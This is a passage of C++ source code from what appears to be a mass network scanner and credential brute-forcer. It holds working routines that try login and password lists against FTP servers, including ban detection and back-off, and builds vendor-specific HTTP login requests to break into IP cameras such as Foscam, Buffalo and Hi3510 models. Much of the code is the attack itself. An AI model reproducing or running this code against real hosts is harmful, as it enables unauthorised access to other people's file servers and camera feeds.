                while(WSAGetLastError() == WSAENOTSOCK)
				{
                    if(gDebugMode) stt->doEmitionDebugFoundData("[FTP][ENOTSOCK] [" + QString(ip) + ":" + QString::number(port) + "]");
					CSSOCKET(sockFTP);
					sockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
					connectionResult = connect(sockFTP, (sockaddr*)&sockAddr, sizeof(sockAddr));
				};
				loginFailedFlag = 0;
			};

			isActive = 1;

			if(connectionResult != SOCKET_ERROR) 
			{
				x = 0;
				while (true)
				{
					Sleep(100);
					ZeroMemory(recvBuff, 1024);
					x = recvWT(sockFTP, recvBuff, 1024, gTimeOut + 5, &bTO);
					if(x <= 0) break;
					if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));

					Activity += x;
					closedSocket = 0;
					if(strstr(recvBuff, "451 The parameter is incorrect") != NULL)
					{
						CSSOCKET(sockFTP);
						isActive = 0;
						stt->doEmition_BARedData("[*] Unknown protocol (451 Error) - " + QString(ip));
						strcpy(lps.other, "Unknown protocol (451 Error)");
						return lps;
					};

					if(strstri(recvBuff, "only anonymous") != NULL)
					{
						CSSOCKET(sockFTP);
						isActive = 0;
						stt->doEmition_BAGreenData("[*] Anonymous access detected - " + QString(ip));

						strcpy(lps.login, "anonymous");
						strcpy(lps.pass, "1");
						return lps;
					};

					if(strstr(recvBuff, "550 no connections allowed") != NULL
						|| strstr(recvBuff, "550-") != NULL
						)
					{
						CSSOCKET(sockFTP);

						isActive = 0;


						stt->doEmition_BARedData("[-] 550 (No connections allowed) - Ban detected. Dropping " + QString(ip));


						strcpy(lps.login, "UNKNOWN");
						return lps;
					};

					if(strstr(recvBuff, "no such command"))
					{
						CSSOCKET(sockFTP);

						isActive = 0;
						stt->doEmition_BARedData("[-] 500 (Sorry, no such command) " + QString(ip));
						strcpy(lps.other, "[500 Sorry, no such command]");
						return lps;
					};

					if((strstr(recvBuff, "500 ") != NULL 
						|| strstr(recvBuff, "500-") != NULL 
						)
						&& strstri(recvBuff, "500 oops") == NULL
						)
					{
						j = 0;
						break;
					};

					if(strstr(recvBuff, "421 ") != NULL || strstr(recvBuff, "421-") != NULL)
					{
						break;
					};

					if(strstri(recvBuff, "530 Sorry, no ANONYMOUS access allowed.") != NULL)
					{
						++i;
						break;
					};

					if(globalScanFlag == false) break;

					if((strstr(recvBuff, "530 Sorry") != NULL) 
						|| (strstr(recvBuff, "530") != NULL && strstr(recvBuff, "maximum") != NULL)
						|| strstr(recvBuff, "exceeded") != NULL
						|| strstr(recvBuff, "421 Too many") != NULL
						|| strstr(recvBuff, "from this IP") != NULL
						|| strstr(recvBuff, "from your IP") != NULL) 
					{
						stt->doEmition_BARedData("[-] FTP: 530 - Ban detected? Waiting 30sec (" + QString(ip) + ")");
						if(j > 0) --j;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						Sleep(30000);
						break;
					}
					else if( (strstr(recvBuff, "220 ") != NULL || loginFailedFlag == 1 || strstr(recvBuff, "503") != NULL || strstr(recvBuff, "server ready") != NULL ))
					{
						strcpy(request, "USER ");
						if(strlen(loginLst[i]) != 0) strcat(request, loginLst[i]);
						else 
						{
							loginFailedFlag = 1;
							break;
						};
						strcat(request, "\r\n");
						if(send(sockFTP, request, strlen(request), 0) != SOCKET_ERROR)
						{
							if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
							Activity += strlen(request);

							ZeroMemory(request, sizeof(request));
						}
						else
						{
							stt->doEmitionRedFoundData("[FTP] Send error. " + QString(ip) + ":" + QString::number(port));
						};
					}
					else if(strstr(recvBuff, "530") != NULL 
						|| strstr(recvBuff, "Login incorrect") != NULL 
						|| strstri(recvBuff, "500 oops") != NULL
						) 
					{	
						loginFailedFlag = 1;
						break;
					}
					else if(strstr(recvBuff, "331") != NULL)
					{
						if(strstr(recvBuff, "Non-anonymous sessions must use encryption") != NULL 
							|| strstr(recvBuff, "Rejected--secure connection required") != NULL
							)
						{
							stt->doEmition_BARedData("FTP server (" + QString(ip) + ") appears to require SSL for specified user: " + QString(loginLst[i]));
							CSSOCKET(sockFTP);

							isActive = 0;

							strcpy(lps.login, "UNKNOWN");
							return lps;
						}
						else if(strstri(recvBuff, "permission denied") == NULL)
						{
							strcpy(request, "PASS ");
							if(strlen(passLst[j]) != 0) strcat(request, passLst[j]);
							else 
							{
								loginFailedFlag = 1;
								break;
							};
							strcat(request, "\r\n");
							if(send(sockFTP, request, strlen(request), 0) != SOCKET_ERROR)
							{
								if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));

								Activity += strlen(request);
								ZeroMemory(request, sizeof(request));

								if(BALogSwitched) stt->doEmitionBAData("Probing FTP: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(loginLst[i]) + ":" + QString(passLst[j]) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
								++passCounter;
							}
							else
							{
								stt->doEmitionRedFoundData("[FTP] Send error. " + QString(ip) + ":" + QString::number(port));
							};
						}
						else
						{
							breakPassLoop = 1;
							stt->doEmition_BARedData("Permission denied for login - " + QString(ip) + ":" + QString::number(port) + "; login: " + QString(loginLst[i]));
							break;
						};
					}
					else if(strstr(recvBuff, "230") != NULL)
					{
						char pass[128] = {0};

						strcpy(pass, ip);
						strcat(pass, " - FTP Password found: ");
						strcat(pass, loginLst[i]);
						strcat(pass, ":");
						strcat(pass, passLst[j]);

						char recvBuff2[2048] = {0};
						if(send(sockFTP, "PASV\r\n", 6, 0) != SOCKET_ERROR)
						{
							int x = 1, xx = 0;
							while(x != 0)
							{
								ZeroMemory(recvBuff, sizeof(recvBuff));
								x = recvWT(sockFTP, recvBuff, sizeof(recvBuff), gTimeOut + 5, &bTO);
								xx += x;
								if(xx < 1536) strncat(recvBuff2, recvBuff, x);
								else break;
							};

							if(strstri(recvBuff2, "unknown command") != NULL || strstri(recvBuff2, "invalid command") != NULL)
							{
								stt->doEmitionYellowFoundData("[-] PASV failed. Router detected?");
								CSSOCKET(sockFTP);
								strcpy(lps.login, loginLst[i]);
								strcpy(lps.pass, passLst[j]);
								strcpy(lps.other, "ROUTER");
								isActive = 0;
								return lps;
							};

							char *ptr0 = strstr(recvBuff2, "227 ");

							if( ptr0 != NULL )
							{
								if(strstr(ptr0, "(") != NULL)
								{
									char pasvData[32] = {0};
									char *ptr1 = strstr(ptr0, "(");
									char *ptr2 = strstr(ptr0, ")");
									int sz = ptr2 - ptr1 - 1;
									strncpy(pasvData, ptr1 + 1, sz);
									char *ptr3 = strstr(pasvData, ",");
									ptr3 = strstr(ptr3 + 1, ",");
									ptr3 = strstr(ptr3 + 1, ",");
									ptr3 = strstr(ptr3 + 1, ",");

									if(ptr3 != NULL)
									{
										char *ptrP2 = strstr(ptr3 + 1, ",");
										char p1c[8] = {0};
										sz = ptrP2 - ptr3 - 1;
										strncpy(p1c, ptr3 + 1, sz);
										int p1 = atoi(p1c);
										int p2 = atoi(ptrP2 + 1);
										port = p1 * 256 + p2;

										sockAddr.sin_port = htons(port);
										SOCKET newSockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
										connectionResult = connect(newSockFTP, (sockaddr*)&sockAddr, sizeof(sockAddr));

										send(sockFTP, "LIST\r\n", 6, 0);
										ZeroMemory(recvBuff, sizeof(recvBuff));
										int x = recvWT(newSockFTP, recvBuff, sizeof(recvBuff), gTimeOut + 3, &bTO);
										if(x <= 0 || strstr(recvBuff, "unknown command") != NULL) 
										{
											send(sockFTP, "MLSD\r\n", 6, 0);
											ZeroMemory(recvBuff, sizeof(recvBuff));
											x = recvWT(newSockFTP, recvBuff, sizeof(recvBuff), gTimeOut + 3, &bTO);
											if(x <= 0 || strstr(recvBuff, "unknown command") != NULL) 
											{
												stt->doEmition_BAGreenData("[?] " + QString(pass) + " 	[MLSD&LIST failed or server closed connection.]");
												
												CSSOCKET(sockFTP);
												CSSOCKET(newSockFTP);
												closedSocket = 1;			
												isActive = 0;
												strcpy(lps.login, "UNKNOWN");
												return lps;
											}
											else {
												stt->doEmition_BAGreenData("[+] " + QString(pass) + " 	[MLSD succeeded]");
												ps->directoryCount = _countFTPDirectories(recvBuff);
											};
										}
										else
										{
											stt->doEmition_BAGreenData("[+] " + QString(pass) + " 	[LIST succeeded]");
											ps->directoryCount = _countFTPDirectories(recvBuff);
										};

										CSSOCKET(newSockFTP);
									}
									else
									{
										stt->doEmitionYellowFoundData("[*] " + QString(ip) + " [PASV failed]");
									};
								}
								else
								{
									stt->doEmitionYellowFoundData("[*] " + QString(ip) + " 	[PASV TO] Failed!");
								};
							}
							else
							{
								stt->doEmitionYellowFoundData("[*] " + QString(ip) + " 	[PASV TO] Failed!");
							};


							if(xx > 1)
							{
								strcpy(ps->headr, "</a><pre><font color=\"goldenrod\"> (");
								strncat(ps->headr, recvBuff, 256);
								strcat(ps->headr, ")</font></pre>");
							};

							strcpy(lps.login, loginLst[i]);
							strcpy(lps.pass, passLst[j]);

							CSSOCKET(sockFTP);
							isActive = 0;
							return lps;
						}
						else
						{
							stt->doEmitionRedFoundData("[FTP] Send error. " + QString(ip) + ":" + QString::number(port));

							strcpy(lps.login, loginLst[i]);
							strcpy(lps.pass, passLst[j]);

							CSSOCKET(sockFTP);
							isActive = 0;
							return lps;
						};
					};
				};
											
				CSSOCKET(sockFTP);
				closedSocket = 1;
				ZeroMemory(recvBuff, sizeof(recvBuff));
			}
			else
            {
				int WSAerr;
				if(connectionResult == -1) WSAerr = WSAGetLastError();
                else WSAerr = WSAETIMEDOUT;

                if(gThreads > 1
					&& WSAerr != WSAETIMEDOUT/*Timeout*/
					&& WSAerr != WSAENOBUFS/*POOLOVERFLOW*/
					&& WSAerr != WSAECONNREFUSED/*WSAECONNREFUSED*/
					&& WSAerr != WSAECONNRESET/*WSAECONNRESET*/
                        && WSAerr != 0)
				{
					stt->doEmitionRedFoundData("[FTPBrute] Cannot connect to " + QString(ip) + " " + QString(std::to_string(WSAerr).c_str()));
				};
				CSSOCKET(sockFTP);	
				isActive = 0;
				strcpy(lps.login, "UNKNOWN");
				return lps;
			};

			Sleep(100);

			if(breakPassLoop) 
			{
				breakPassLoop = false;
				break;
			};
		};
	};

	CSSOCKET(sockFTP);
	isActive = 0;
	strcpy(lps.login, "UNKNOWN");
	return lps;
}

lopaStr _FTPLobby(char *ip, int port, PathStr *ps)
{
	while(BrutingThrds >= gMaxBrutingThreads) Sleep(700);

	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));

	BConInc();
	lps = _FTPBrute(ip, port, ps);
	BConDec();
	
	return lps;
}

int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int passCounter, char *type, std::vector<char*> negVector)
{
	char recvBuff[256] = {0};
	char recvBuff2[4096] = {0};

	SOCKET sock;
	sockaddr_in sockAddr;
	int bTO; 
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);
	HOSTENT *host;  
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
	else 
	{
		return -1;
	};
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
    else if(host=gethostbyname(ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
		return -1;
	};
#endif
	sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	int cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
	int cErrCode = WSAGetLastError();

    while(cErrCode == WSAENOTSOCK)
	{
		CSSOCKET(sock);
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
		cErrCode = WSAGetLastError();
        if(gDebugMode) stt->doEmitionDebugFoundData("[" + QString(type) + "][ENOTSOCK] [" + QString(ip) + ":" + QString::number(port) + "]");
	};

	if(cCode != SOCKET_ERROR) 
    {
		Activity += strlen(request);

		if(send(sock, request, strlen(request), 0) == SOCKET_ERROR) 	
		{
			stt->doEmitionRedFoundData("[" + QString(type) + "] Send error! [" + QString(ip) + "]");
			CSSOCKET(sock);
			return 0;
		}
		else 
		{
			if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
			int x = 1;
			int xx = 0;
			ZeroMemory(recvBuff2, sizeof(recvBuff2));
			while(xx < 3072)
			{
				ZeroMemory(recvBuff, sizeof(recvBuff));
				x = recvWT(sock, recvBuff, sizeof(recvBuff), gTimeOut + 2, &bTO);
				if(x <= 0) break;
				strncat(recvBuff2, recvBuff, x);
				xx += x;
				Activity += x;
			};

			if(BALogSwitched) stt->doEmitionBAData("Checked " + QString(type) + ": " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(login) + ":" + QString(pass) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");

			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff2));

			if(strlen(recvBuff2) > 0) {
				bool result = true;
				for(int i = 0; i < negVector.size(); ++i)
				{
					if(strstri(recvBuff2, negVector[i]) != NULL)
					{
						result = false;
						break;
					};
				};

				if(result)
				{
					CSSOCKET(sock);
					return 1;
				};
			}
		};
	};

	CSSOCKET(sock);
	return 0;
}

lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));
	char login[128] = {0};
	char pass[128] = {0};
	char request[1024] = {0};
	isActive = 1;
	int passCounter = 1;

	std::vector<char*> negVector;
	if(strcmp(SPEC, "IPC") == 0)
	{
		negVector.push_back("<UserGroup>Invalid</UserGroup>");
	}
	else if(strcmp(SPEC, "GEO") == 0)
	{
		negVector.push_back("Access denied");
		negVector.push_back("ErrNoSuchUsr.htm");
	}
	else if(strcmp(SPEC, "EasyCam") == 0)
	{
		negVector.push_back("Set-Cookie: usrLevel=-1;path=/");
	}
	else if(strcmp(SPEC, "Foscam") == 0)
	{
		negVector.push_back("<result>0</result>");
		negVector.push_back("<result>-1</result>");
		negVector.push_back("<result>-2</result>");
		negVector.push_back("<result>-3</result>");
		negVector.push_back("<result>-4</result>");
		negVector.push_back("<result>-5</result>");
		negVector.push_back("<result>-6</result>");
		negVector.push_back("<result>-7</result>");
	}
	else if(strcmp(SPEC, "AVIOSYS") == 0)
	{
		negVector.push_back("Password Error");
	}
	else if(strcmp(SPEC, "BUFFALO") == 0)
	{
		negVector.push_back("403 Forbidden");
	}
	else if(strcmp(SPEC, "DVS") == 0)
	{
		negVector.push_back("Non-Existed");
	}
	else if(strcmp(SPEC, "IPCAM") == 0)
	{
		negVector.push_back("var check=\"0\"");
		negVector.push_back("var authLevel =\"0\";");
	}
	else if(strcmp(SPEC, "IEORFOREFOX") == 0)
	{
		negVector.push_back("AAA()");
		negVector.push_back("РРјСЏ РёР»Рё РїР°СЂРѕР»СЊ РЅРµРІРµСЂРЅС‹Рµ!");
		negVector.push_back("Р’РѕР·РІСЂР°С‚");
		negVector.push_back("HTTP/1.0 302 Found");
	}
	else
	{
		stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
		isActive = 0;
		strcpy(lps.login, "UNKNOWN");
		return lps;
	};

	for(int i = 0; i < MaxLogin; i++)
	{
		if(globalScanFlag == false) break;
		if(strcmp(loginLst[i], " ") == 0) continue;
		ZeroMemory(login, sizeof(login));
		strcpy(login, loginLst[i]);
		for(int j = 0; j < MaxPass; j++)
		{
			if(globalScanFlag == false) break;
			if(strcmp(passLst[j], " ") == 0) continue;
			
			ZeroMemory(pass, sizeof(pass));
			strcpy(pass, passLst[j]);

			ZeroMemory(request, sizeof(request));
			if(strcmp(SPEC, "IPC") == 0)
			{
				strcpy(request, "GET /login.xml?user=");
				strcat(request, login);
				strcat(request, "&usr=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);				
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "GEO") == 0)
			{
				strcpy(request, "GET /Login.cgi?username=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "EasyCam") == 0)
			{
				strcpy(request, "GET /login.xml?user=");
				strcat(request, login);
				strcat(request, "&usr=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "Foscam") == 0)
			{
				strcpy(request, "GET /cgi-bin/CGIProxy.fcgi?usr=");
				strcat(request, login);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, "&cmd=logIn&usrName=");
				strcat(request, login);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "AVIOSYS") == 0)
			{
				strcpy(request, "GET /check_user.html?UserName=");
				strcat(request, login);
				strcat(request, "&PassWord=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "BUFFALO") == 0)
			{
				strcpy(request, "POST /rpc/login HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
				int loginLength = strlen(login);
				int passLength = strlen(pass);
				int sz = loginLength + passLength + strlen("user=&password=");
				char *passString = new char[sz + 1];
				ZeroMemory(passString, sizeof(passString));
				strcpy(passString, "user=");
				strcat(passString, login);
				strcat(passString, "&password=");
				strcat(passString, pass);
				strcat(request, "\r\nContent-Length: ");
				char tempBuff[16] = {0};
                sprintf(tempBuff, "%d", sz);
                strcat(request, tempBuff);
				strcat(request, "\r\n\r\n");
				strcat(request, passString);
				delete []passString;
			}
			else if(strcmp(SPEC, "DVS") == 0)
			{
				strcpy(request, "POST /login HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
                    char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
				int loginLength = strlen(login);
				int passLength = strlen(pass);
				int sz = loginLength + passLength + strlen("langs=en&user=&password=&submit=+Login+");
				char *passString = new char[sz + 1];
				ZeroMemory(passString, sizeof(passString));
				strcpy(passString, "langs=en&user=");
				strcat(passString, login);
				strcat(passString, "&password=");
				strcat(passString, pass);
				strcat(passString, "&submit=+Login+");
				strcat(request, "\r\nContent-Length: ");
				char tempBuff[16] = {0};
                sprintf(tempBuff, "%d", sz);
                strcat(request, tempBuff);
				strcat(request, "\r\n\r\n");
				strcat(request, passString);
				delete []passString;
			}
			else if(strcmp(SPEC, "IPCAM") == 0)
			{
				strcpy(request, "GET /cgi-bin/hi3510/checkuser.cgi?&-name=");
				strcat(request, login);
				strcat(request, "&-passwd=");
				strcat(request, pass);
				strcat(request, "&-time=1416767330831 HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			
			}
			else if(strcmp(SPEC, "IEORFOREFOX") == 0)
			{
				strcpy(request, "POST /logincheck.rsp?type=1 HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
				int loginLength = strlen(login);
				int passLength = strlen(pass);
				int sz = loginLength + passLength + strlen("username=&userpwd=");
				char *passString = new char[sz + 1];
				ZeroMemory(passString, sizeof(passString));
				strcpy(passString, "username=");
				strcat(passString, login);
				strcat(passString, "&userpwd=");
				strcat(passString, pass);
				strcat(request, "\r\nContent-Length: ");
				char tempBuff[16] = {0};
                sprintf(tempBuff, "%d", sz);
                strcat(request, tempBuff);
				strcat(request, "\r\n\r\n");
				strcat(request, passString);
				delete []passString;
			};

			int res = _webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector);

			if(res == 1)
			{
				isActive = 0;
				strcpy(lps.login, loginLst[i]);
				strcpy(lps.pass, passLst[j]);
				return lps;
			}
			else if(res == -1)
			{
				isActive = 0;
				strcpy(lps.login, "UNKNOWN");
				return lps;
			};
			++passCounter;
		};
	};
	isActive = 0;
	strcpy(lps.login, "UNKNOWN");
	return lps;
}

lopaStr _IPCameraBLobby(char *ip, int port, char *SPEC)
{
	while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

	BConInc();
	lopaStr res = _IPCameraBrute(ip, port, SPEC);
	BConDec();
	
	return res;
}








//int Connector::_ConnectToPort(char *ip, int port, char *hl)
//{
//	if(gPingNScan)
//	{
//		if(_pingMyTarget(ip) == 0)
//		{
//			return -2;
//		};
//	};

//    std::string buffer;
//    int size = 0;

//    if(port == 22) size = _SSHLobby(ip, port, &buffer);
//    else size = Connector::nConnect(ip, port, &buffer);

//    if(size > 0)
//	{
//		++Alive;
//		++found;
//		stt->doEmitionChangeParsed(QString::number(saved) + "/" + QString::number(found));

//        conSTR CSTR;
//        CSTR.lowerBuff = new char[size + 1];
//        CSTR.size = size;
//        memcpy(CSTR.lowerBuff, buffer.c_str(), size);
//        memset(CSTR.lowerBuff + size, '\0', 1);

//		Lexems lx;
//        lx._filler(port, (char *)buffer.c_str(), ip, size, &lx, hl);

//        delete []CSTR.lowerBuff;
//        CSTR.lowerBuff = NULL;
//    };

//    return 0;
//}
